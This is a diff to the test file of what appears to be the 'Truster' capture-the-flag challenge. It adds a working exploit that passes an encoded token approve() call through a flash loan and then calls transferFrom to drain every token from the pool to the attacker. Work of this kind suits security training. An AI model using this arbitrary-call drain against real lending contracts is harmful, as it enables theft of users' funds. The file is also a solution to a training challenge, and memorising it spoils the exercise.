@@ -34,6 +34,32 @@ describe('[Challenge] Truster', function () {
     after(async function () {
         /** SUCCESS CONDITIONS */
 
+        const AttackTrusterDeployer = await ethers.getContractFactory("AttackTruster", attacker);
+        const attackContract = await AttackTrusterDeployer.deploy(this.pool.address, this.token.address);
+
+        const attackToken = this.token.connect(attacker);
+
+        const amount = 0;
+        const borrower = attacker.address;
+        const target = this.token.address;
+
+        // Create the ABI to approve the attacker to spend the tokens in the pool
+        const abi = ["function approve(address spender, uint256 amount)"]
+        const iface = new ethers.utils.Interface(abi);
+        const data = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
+
+        await attackContract.attack(amount, borrower, target, data);
+
+        const allowance = await attackToken.allowance(this.pool.address, attacker.address);
+        const balance = await attackToken.balanceOf(attacker.address);
+        const poolBalance = await attackToken.balanceOf(this.pool.address);
+
+        console.log("Attacker balance:", balance.toString())
+        console.log("Pool balance:", poolBalance.toString())
+        console.log("Allowance:", allowance.toString());
+
+        await attackToken.transferFrom(this.pool.address, attacker.address, allowance);
+
         // Attacker has taken all tokens from the pool
         expect(
             await this.token.balanceOf(attacker.address)
